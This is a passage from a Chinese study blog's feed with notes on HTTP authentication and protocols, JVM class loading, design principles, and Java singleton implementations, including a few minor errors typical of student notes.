但是base64不属于加密，等同于明文。</p><p>digest认证使用<strong>质询响应方式</strong>：一开始一方会先发送认证要求给另一方，接着使用从另一方那接收到的质询码计算生成响应码。最后将响应码回给对方进行认证。安全等级高于Basic</p><p>ssl客户端认证需要将客户端证书发给客户端，客户端需要安装此证书。</p><p><strong>双因素认证</strong>指在认证过程中不仅需要密码这一个因素，还需要申请认证者提供其他持有信息，从而作为另一个因素，与其组合使用的认证方式。</p><p>通过向用户发放sessionid，记录认证状态。在cookie中存储sessionid，为防止xxs跨站脚本攻击，应在cookie内加上Httponly属性。如果cookie中设置了HttpOnly属性，那么通过js脚本将无法读取到cookie信息，这样能有效的防止XSS攻击，窃取cookie内容，这样就增加了cookie的安全性</p><hr><p><strong>http的瓶颈</strong></p><ol><li>一条连接上只可发送一个请求</li><li>请求只能从客户端开始。客户端不可以接受除响应以外的指令。</li><li>请求/响应首部未经压缩就发送。首部信息越多延迟越大。</li><li>发送冗长的首部。每次互相发送发送相同的首部造成的浪费比较多。</li><li>可任意选择数据压缩格式。非强制压缩发送。</li></ol><p><strong>Ajax</strong>（Asynchronous javascript and xml）异步javascrip 与xml技术，利用javascript和Dom的操作，以达到局部web页面替换加载的异步通信手段。只更新一部分页面，响应中传输的数据量也会因此减少。</p><p>ajax仍不能解决http协议本身的问题，每次都互相发送相同的首部，有时不压缩数据直接发送。</p><p><strong>Comet</strong>一旦服务端内容更新了，comet不会让请求等待，而是直接给客户端响应。通过延迟应答，模拟实现服务器端向客户端推送的功能。仍无法解决http协议本身存在的问题。 </p><ol><li>通常服务器端收到请求，在处理完毕后就会立即返回响应，但是为了实现推送这个功能</li><li>Comett会先将响应置于挂起状态</li><li>服务器端有内容更新时，再返回该响应</li></ol><hr><p><strong>SPDY</strong>没有改写HTTP协议，而是在TCP/IP的应用层与运输层之间通过新加会话层的形式运作。同时规定通信使用SSL。SPDY控制对数据的流动，仍采用HTTP建立通信连接。</p><p>SPDY使得HTTP协议获得以下功能：</p><ol><li><p>多路复用流</p><p>通过单一的TCP连接，可以无限制处理多个HTTP请求。</p></li><li><p>赋予请求优先级</p></li><li><p>压缩HTTP首部</p></li><li><p>推送功能</p><p>支持服务器主动向客户端推送数据的功能。服务器可以直接发送数据，而不必等待客户端请求。</p></li><li><p>服务器提示功能</p><p>服务器可以制动提示客户端请求资源</p></li></ol><hr><p>WebSocket是Web浏览器与Web服务器之间全双工通信标准。 </p><ol><li>握手请求</li><li>握手响应，响应101，切换成WebSocket协议</li></ol><p>CGI（Common GateWay Interface ) 通用网关接口是指Web服务器在接收到客户端发送过来的请求后转发给程序的一组机制。</p><p><strong>xxs</strong>跨站脚本攻击，使用javascript</p><p><strong>os</strong>攻击，通过web应用执行非法的操作体统命令达到攻击的目的。通过OS注入攻击可执行sql上安装的各种应用程序。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Http&quot;&gt;&lt;a href=&quot;#Http&quot; class=&quot;headerlink&quot; title=&quot;Http&quot;&gt;&lt;/a&gt;Http&lt;/h1&gt;&lt;p&gt;1、URI（uniform统一+resource资源+identifier标识符）&lt;/p&gt;
&lt;p&gt;2、RFC（Request</summary>
      
    
    
    
    <category term="秋招学习" scheme="https://a2914475618.github.io/categories/%E7%A7%8B%E6%8B%9B%E5%AD%A6%E4%B9%A0/"/>
    
    
    <category term="HTTP" scheme="https://a2914475618.github.io/tags/HTTP/"/>
    
  </entry>
  
  <entry>
    <title>JVM</title>
    <link href="https://a2914475618.github.io/2021/10/20/JVM/"/>
    <id>https://a2914475618.github.io/2021/10/20/JVM/</id>
    <published>2021-10-20T07:29:51.000Z</published>
    <updated>2021-11-25T13:30:55.546Z</updated>
    
    <content type="html"><![CDATA[<h1 id="JVM学习"><a href="#JVM学习" class="headerlink" title="JVM学习"></a>JVM学习</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>jvm跨语言的平台,java不是最强大的语言,jvm是最强大的虚拟机。</p><p>虚拟机分为</p><ol><li><p>系统虚拟机</p></li><li><p>程序虚拟机</p><p>java虚拟机，专门为执行单个计算机程序而设计，在java虚拟机中执行的指令我们称为java字节码指令。</p></li></ol><p>java虚拟机是二进制字节码的运行环境。</p><p>特点：</p><ol><li>一次编译</li><li>自动内存管理</li><li>自动垃圾回收功能</li></ol><p>通过编译成字节码文件为编译器的前端</p><p><strong>jvm的架构模型</strong></p><ol><li><p>基于栈的指令集架构（hotspot）</p><p>跨平台性、指令集少，指令多、执行性能比寄存器差</p></li><li><p>基于寄存器的指令集架构</p></li></ol><p><strong>jvm的生命周期</strong></p><ol><li><p>启动</p><p>通过引导类加载器(bootstrap class loader)创建一个初始类initial class来完成，该类由虚拟机具体实现指定。</p></li><li><p>执行</p><p>执行java程序</p></li><li><p>退出</p><p>正常执行结束</p><p>遇到异常或者错误而终止</p><p>操作系统出现错误，java虚拟机进程终止</p><p>线程调用Runtime类或System类的exit方法，或Runtime类的halt方法</p></li></ol><p>hotspot 虚拟机</p><ol><li>其他两个商用虚拟机都没有方法区概念</li><li>热点代码检测技术</li><li>通过解释器与编译器协同工作</li></ol><p>jRockit 虚拟机</p><ol><li>专注于服务器端</li><li>内部不包含解析器，全部代码靠JIT</li><li>最快的JVM</li></ol><p>J9 虚拟机  IBM公司</p><h2 id="①类加载子系统"><a href="#①类加载子系统" class="headerlink" title="①类加载子系统"></a>①类加载子系统</h2><p>类加载子系统负责从文件系统或者网络中加载class文件，class文件在文件开头有特定的文件标识。</p><p>class loader只负责class文件的加载，至于是否可运行，由执行引擎决定。</p><p><strong>1.加载</strong></p><ol><li>通过一个类的全限定名获取此定义类的二进制字节流</li><li>将这个字节流所代表的静态存储结构转化为方法区的运行时数据结构</li><li>在内存中生成一个代表这个类的class对象，作为方法区这个类的各种数据的访问入口。</li></ol><p><strong>2.链接</strong></p><ol><li><p>验证</p><p>确保class文件的字节流中包含信息符合当前虚拟机要求，保证加载类正确性ca fa ba be</p><p>包括</p><ol><li>文件格式验证</li><li>元数据验证</li><li>字节码验证</li><li>符号引用验证</li></ol></li><li><p>准备</p><p>1.为<strong>类变量</strong>分配内存并且设置该变量的默认初始值，即零值。</p><p>2.不包含用final修饰的static,因为final在编译时就会分配，准备阶段显示初始化</p><p>3.不会为实例变量分配初始化，类变量分配在方法区，实例变量随着对象一起分配道到Java堆中</p></li><li><p>解析</p><p>将常量池内的符号引用转换为直接引用的过程</p><p>主要针对类或接口、字段、类方法、接口方法、方法类型等。</p></li></ol><p><strong>3.初始化</strong></p><ul><li><p>初始化阶段就是执行类构造器方法<client>()方法的过程</p></li><li><p>无需定义，是<strong>javac编译器自动收集类中的所有类变量的赋值动作和静态代码块中的语句合并而来。</strong></p></li><li><p><client>()不同于类的构造器（关联：构造器是虚拟机视角下的<init>()方法，构造器函数</p></li><li><p>若该类具有父类，JVM保证子类的<clinit>（）执行前，父类的<clinit>已经执行完毕</p></li><li><p>虚拟机保证一个类的<client>()方法再多线程下被同步加锁。一个类只会加载一次</p></li></ul><h3 id="类加载的分类"><a href="#类加载的分类" class="headerlink" title="类加载的分类"></a>类加载的分类</h3><p>JVM支持两种类型的类加载器</p><ol><li><p>引导类加载器(bootstrap classloader)</p><ol><li>bootstrap class loader由C++编写的</li><li>加载扩展类和应用程序类加载器，并指定为他们的父类加载器</li><li>获取不到</li></ol></li><li><p>自定义类加载器</p><p>将所有派生于抽象类classloader的类加载器都划分为自定义类加载器（包括扩展类加载器、应用程序类加载器）</p><ol><li><p>对于用户自定义的类来说，默认使用系统类加载器进行加载。</p></li><li><p>String类使用引导类加载器进行加载的，JAVA的核心类库都是使用引导类加载器进行加载的（bootstrap class loader）</p></li></ol></li></ol><h3 id="双亲委派机制"><a href="#双亲委派机制" class="headerlink" title="双亲委派机制"></a>双亲委派机制</h3><p>java虚拟机对class文件采用的是<strong>按需加载</strong>方式，当需要使用该类时才会将它的class文件加载到内存生成class对象。</p><p>加载某个类的class文件时，java虚拟机采用的是双亲委派机制，把请求交给父类，是一种任务委派模式。</p><p><strong>工作原理</strong>：</p><ol><li>类加载器收到类加载的请求，将该请求委托给自己的父类加载器去执行</li><li>如果父类还存在父类加载器，则进一步向上委托，依次递归，到达顶层的启动类加载器。</li><li>如果父类加载器可以完成加载任务，则加载，否则让子加载器进行加载。</li></ol><p><strong>优势</strong>：</p><ol><li>避免类的重复加载</li><li>保护程序安全，防止核心API被篡改  eg：自定义 Java.lang.String</li></ol><p><strong>沙箱安全机制</strong>：</p><p>沙箱机制就是将 Java 代码限定在虚拟机(JVM)特定的运行范围中，并且严格限制代码对本地系统资源访问，通过这样的措施来保证对代码的有效隔离，防止对本地系统造成破坏。沙箱<strong>主要限制系统资源访问</strong></p><p>自定义String类时，加载自定义String类时会率先使用引导类加载器，而引导类加载器再加载的过程会先加载jdk自带的文件。保证对java核心源代码的保护。</p><p>Jvm中表示两个class对象是否为同一个类存在两个必要条件：</p><ol><li>类的完整类名必须一致，包括包名</li><li>加载这个类的classloader（指classloader实例对象）必须相同</li></ol><p>JVM必须知道一个类是由启动类加载器加载的还是由用户类加载器加载的。如果类型是用户类加载器加载的，JVM会将这个类加载器的一个引用作为类型信息的一部分保存再方法区中。解析一个类型到另一个类型的引用时，JVM必须保证这两个类型的类加载器是相同的。</p><p>JAVA程序对类的使用方式为：</p><ol><li>主动使用<ol><li>创建类的实例</li><li>访问某个类或接口的静态常量，或者对该静态变量赋值</li><li>调用类的静态方法</li><li>反射</li><li>初始化一个类的子类</li><li>JAVA虚拟机启动时被标明为启动类的类</li></ol></li><li>被动使用（不会导致类的初始化）</li></ol><h2 id="②运行时数据区"><a href="#②运行时数据区" class="headerlink" title="②运行时数据区"></a>②运行时数据区</h2><p>一个JVM实例对应一个Runtime实例</p><p>JVM线程：</p><p>线程是一个程序里的运行单元。JVM允许一个应用有多个线程并行的执行。</p><p>再HOTspot JVM里每个线程都与操作系统的本地线程直接映射。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;JVM学习&quot;&gt;&lt;a href=&quot;#JVM学习&quot; class=&quot;headerlink&quot; title=&quot;JVM学习&quot;&gt;&lt;/a&gt;JVM学习&lt;/h1&gt;&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前</summary>
      
    
    
    
    <category term="知识积累" scheme="https://a2914475618.github.io/categories/%E7%9F%A5%E8%AF%86%E7%A7%AF%E7%B4%AF/"/>
    
    
    <category term="JVM" scheme="https://a2914475618.github.io/tags/JVM/"/>
    
  </entry>
  
  <entry>
    <title>设计模式</title>
    <link href="https://a2914475618.github.io/2021/10/11/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/"/>
    <id>https://a2914475618.github.io/2021/10/11/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/</id>
    <published>2021-10-11T12:26:35.000Z</published>
    <updated>2021-12-20T06:28:19.840Z</updated>
    
    <content type="html"><![CDATA[<h1 id="设计模式"><a href="#设计模式" class="headerlink" title="设计模式"></a>设计模式</h1><p>设计模式的目的：</p><p>解决耦合性，内聚性，可维护性，重用性，灵活性等问题</p><h2 id="设计原则"><a href="#设计原则" class="headerlink" title="设计原则"></a>设计原则</h2><h3 id="一、单一职责原则"><a href="#一、单一职责原则" class="headerlink" title="一、单一职责原则"></a>一、单一职责原则</h3><p>⼀个类、接⼝或⽅法只负责⼀个职责，降低代码复杂度以及变更引起的⻛险。  </p><p>只要类足够简单，可以再方法级别遵守单一职责原则。</p><h3 id="二、接口隔离原则"><a href="#二、接口隔离原则" class="headerlink" title="二、接口隔离原则"></a>二、接口隔离原则</h3><p>一个类对另一个类的依赖应该建立在最小的接口上，防止实现不必要的方法。</p><p>将接口拆分为独立的最小几个接口。</p><h3 id="三、依赖倒置原则"><a href="#三、依赖倒置原则" class="headerlink" title="三、依赖倒置原则"></a>三、依赖倒置原则</h3><ol><li>高层模块不应该依赖底层模块、二者都应该依赖抽象</li><li>抽象不应该依赖于细节，细节应该依赖于抽象</li><li>依赖倒置的中心思想是面向接口编程</li></ol><p>抽象的东西要稳定的多</p><p>依赖关系传递的三种方式：</p><ol><li>接口传递</li><li>构造方法传递</li><li>setter方式传递</li></ol><p>底层模块尽量都要有抽象类或接口，或者两者都有，程序的稳定性更好</p><p>变量的声明类型尽量是抽象类或接口，这样我们的变量引用和实际对象间，就存在一个缓冲层，利于程序扩展和优化</p><h3 id="四、里式替换原则"><a href="#四、里式替换原则" class="headerlink" title="四、里式替换原则"></a>四、里式替换原则</h3><p>所有引用基类的地方必须能透明地使用子类的对象</p><p>在使用继承时，遵循里式替换原则，再子类中尽量不要重写父类的方法</p><p>继承实际是让两个类的耦合性增强了</p><p>解决方法：原来的父类和子类都都继承一个更通俗的基类，原有的继承关系去掉，采用依赖、聚合，组合等关系代替。</p><p><img src="https://cdn.jsdelivr.net/gh/a2914475618/github-jsdelivr-@main/img/20211014151059.png"></p><h3 id="五、开闭原则"><a href="#五、开闭原则" class="headerlink" title="五、开闭原则"></a>五、开闭原则</h3><p>对扩展（提供方）开放，对修改（使用方）关闭。</p><p>用抽象构建框架、用实现扩展细节。</p><p>软件设计的核心。</p><h3 id="六、迪米特法则"><a href="#六、迪米特法则" class="headerlink" title="六、迪米特法则"></a>六、迪米特法则</h3><p>一个对象应该对其他对象保持最少的了解，对于被以来的类不管多么复杂，都尽量将逻辑封装在类的内部。</p><p>又叫最少知道原则。只与直接的朋友进行通信</p><p><strong>直接的朋友</strong>：B类作为A类的成员变量，B类的对象作为A类方法的参数，B类作为A类方法的返回值。</p><p>让每个类都减少了不必要的依赖。</p><p>避免在类中的局部变量不是直接的朋友。</p><h3 id="七、合成复用原则"><a href="#七、合成复用原则" class="headerlink" title="七、合成复用原则"></a>七、合成复用原则</h3><p>原则是尽量使用合成、聚合的方式，而不是使用继承。</p><p>依赖：A的对象在B类方法参数里</p><p>聚合：A的实例在B的成员变量里  表示的是整体和部分的关系。整体和部分可以分开。相当于电脑类 与  鼠标类和键盘类 </p><p>组合：B的实例被创建时A的实例一同被创建。也是整体与部分的关系。整体与部分不可以分开。类似于Head类和Person类</p><p>关联关系：类与类之间的关联关系</p><ol><li>单向一对一  people对id</li><li>双向一对一  people与id  id对people</li></ol><h2 id="java设计模式"><a href="#java设计模式" class="headerlink" title="java设计模式"></a>java设计模式</h2><p>设计模式类型：</p><ol><li><p><strong>创建型模式</strong></p><p><strong>单例模式</strong>、抽象工厂模式、原型模式、建造者模式、<strong>工厂模式</strong></p></li><li><p><strong>结构性模式</strong></p><p>适配器模式、桥接模式、<strong>装饰模式</strong>、组合模式、外观模式、享元模式、<strong>代理模式</strong></p></li><li><p><strong>行为型模式</strong></p><p>模板方法模式、命令模式、访问者模式、迭代器模式、<strong>观察者模式</strong>、中介者模式、备忘录模式、解释器模式、状态模式、策略模式、职责链模式</p></li></ol><h3 id="1、创建型模式"><a href="#1、创建型模式" class="headerlink" title="1、创建型模式"></a>1、创建型模式</h3><h4 id="单例模式"><a href="#单例模式" class="headerlink" title="单例模式"></a>单例模式</h4><p>采取一定的方法保证软件系统中，对某个类只能存在一个对象实例，并且该类只提供一个取得对象实例的方法。</p><h5 id="饿汉式"><a href="#饿汉式" class="headerlink" title="饿汉式"></a>饿汉式</h5><p>在类装载时完成实例化。可以避免线程同步。</p><p>缺点是没有达到懒加载的效果。如果从开始至终从未使用过这个实例，会造成内存浪费。</p><p>静态常量</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//饿汉式(静态变量)</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Singleton</span> </span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">//1. 构造器私有化, 外部能new</span></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="title">Singleton</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//2.本类内部创建对象实例</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">static</span> Singleton instance = <span class="keyword">new</span> Singleton();</span><br><span class="line"></span><br><span class="line"><span class="comment">//3. 提供一个公有的静态方法，返回实例对象</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Singleton <span class="title">getInstance</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">return</span> instance;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>静态代码块</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//饿汉式</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Singleton</span> </span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">//1. 构造器私有化, 外部能new</span></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="title">Singleton</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//2.本类内部创建对象实例</span></span><br><span class="line"><span class="keyword">private</span>  <span class="keyword">static</span> Singleton instance;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> &#123; <span class="comment">// 在静态代码块中，创建单例对象</span></span><br><span class="line">instance = <span class="keyword">new</span> Singleton();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//3. 提供一个公有的静态方法，返回实例对象</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Singleton <span class="title">getInstance</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">return</span> instance;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="懒汉式"><a href="#懒汉式" class="headerlink" title="懒汉式"></a>懒汉式</h5><p>当用到构造方法时才会去创建，可以起到懒加载的效果</p><p>——线程不安全</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Singleton</span> </span>&#123;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> Singleton instance;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="title">Singleton</span><span class="params">()</span> </span>&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//提供一个静态的公有方法，当使用到该方法时，才去创建 instance</span></span><br><span class="line"><span class="comment">//即懒汉式</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Singleton <span class="title">getInstance</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">if</span>(instance == <span class="keyword">null</span>) &#123;</span><br><span class="line">instance = <span class="keyword">new</span> Singleton();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> instance;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>线程不安全的原因：在多线程下，一个线程进入了if判断语句块，还没来得及往下执行，另一个线程也通过了这个判断语句，便会产生多个实例。</p><p>所以不能在多线程的环境下使用</p><p>——-线程安全，同步方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 懒汉式(线程安全，同步方法)</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Singleton</span> </span>&#123;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> Singleton instance;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="title">Singleton</span><span class="params">()</span> </span>&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//提供一个静态的公有方法，加入同步处理的代码，解决线程安全问题</span></span><br><span class="line"><span class="comment">//即懒汉式</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">synchronized</span> Singleton <span class="title">getInstance</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">if</span>(instance == <span class="keyword">null</span>) &#123;</span><br><span class="line">instance = <span class="keyword">new</span> Singleton();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> instance;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>解决了线程不安全的问题。</p><p>但是效率太低，每个线程在想获得类的实例的时候。执行getInstance方法都要进行同步。而其实这个方法只执行一次实例化代码就够了，后面的想获得该实例，直接return就行了。</p><p>————同步代码块</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">class Singleton &#123;</span><br><span class="line">private static volatile Singleton instance;</span><br><span class="line"></span><br><span class="line">private Singleton() &#123;&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">public static synchronized Singleton getInstance() &#123;</span><br><span class="line">if(instance &#x3D;&#x3D; null) &#123;</span><br><span class="line">synchronized (Singleton.class) &#123;</span><br><span class="line"></span><br><span class="line">instance &#x3D; new Singleton();</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">return instance;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>直接不推荐使用</p><p>只要进入到if中就会创建多个实例。</p><h5 id="双重检查"><a href="#双重检查" class="headerlink" title="双重检查"></a>双重检查</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 懒汉式(线程安全，同步方法)</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Singleton</span> </span>&#123;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">volatile</span> Singleton instance;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="title">Singleton</span><span class="params">()</span> </span>&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//提供一个静态的公有方法，加入双重检查代码，解决线程安全问题, 同时解决懒加载问题</span></span><br><span class="line"><span class="comment">//同时保证了效率, 推荐使用</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">synchronized</span> Singleton <span class="title">getInstance</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">if</span>(instance == <span class="keyword">null</span>) &#123;</span><br><span class="line"><span class="keyword">synchronized</span> (Singleton.class) &#123;</span><br><span class="line"><span class="keyword">if</span>(instance == <span class="keyword">null</span>) &#123;</span><br><span class="line">instance = <span class="keyword">new</span> Singleton();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> instance;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过使用volatile使得更改后可以刷新到内存。通过两次检查，延迟加载，线程安全，效率较高。</p><h5 id="静态内部类"><a href="#静态内部类" class="headerlink" title="静态内部类"></a>静态内部类</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 静态内部类完成， 推荐使用</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Singleton</span> </span>&#123;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">volatile</span> Singleton instance;</span><br><span class="line"></span><br><span class="line"><span class="comment">//构造器私有化</span></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="title">Singleton</span><span class="params">()</span> </span>&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//写一个静态内部类,该类中有一个静态属性 Singleton</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">SingletonInstance</span> </span>&#123;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> Singleton INSTANCE = <span class="keyword">new</span> Singleton(); </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//提供一个静态的公有方法，直接返回SingletonInstance.INSTANCE</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">synchronized</span> Singleton <span class="title">getInstance</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> SingletonInstance.INSTANCE;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当外部类被装载时，静态内部类并不会被装载。</p><p>采用了类装载的机制来保证初始化实例时只有一个线程。</p><p>调用getInstance方法时，才会装载该类，从而完成Singleton的实例化。</p><p>类的静态属性只会在第一次加载类的时候初始化，所以在这里，jvm帮我们保证了线程的安全性，在类进行初始化的时候，别的线程是无法进入的。</p><h5 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//使用枚举，可以实现单例, 推荐</span></span><br><span class="line"><span class="class"><span class="keyword">enum</span> <span class="title">Singleton</span> </span>&#123;</span><br><span class="line">INSTANCE; <span class="comment">//属性</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">sayOK</span><span class="params">()</span> </span>&#123;</span><br><span class="line">System.out.println(<span class="string">&quot;ok~&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//通过  Singleton.INSTANCE进行调用。</span></span><br></pre></td></tr></table></figure><p>不仅能避免多线程同步的问题，还能防止反序列化重新创建新的对象。</p><p>java的作者推荐使用。Josh Bloch</p><p><strong>JDK中的Runtime类</strong></p><p>实际上是使用了饿汉式创建Runtime的类</p><p><strong>单例模式注意事项和细节说明</strong></p><p>当想要实例化一个单例类的时候，必须记住使用相应的获取对象的方法，而不是使用New</p><p><strong>单例使用的场景</strong></p><ol><li>需要频繁的进行创建和销毁的对象。</li><li>工具类对象</li><li>频繁访问数据库或文件的对象。比如数据源、session工厂</li></ol><h3 id="2、结构型模式"><a href="#2、结构型模式" class="headerlink" title="2、结构型模式"></a>2、结构型模式</h3><h4 id="适配器模式"><a href="#适配器模式" class="headerlink" title="适配器模式"></a>适配器模式</h4><p>将某个类的接口转换成客户端期望的另一个接口表示，主要的目的是兼容性，让原本因接口不匹配的不能一起工作的两个类可以协同工作。别名为包装器。</p><p>属于结构型模式</p><p>分为三类：类适配器模式、对象适配器模式、接口适配器模式</p><p>src  适配器源  被适配的类</p><p>dst   目标源</p><h5 id="类适配器模式"><a 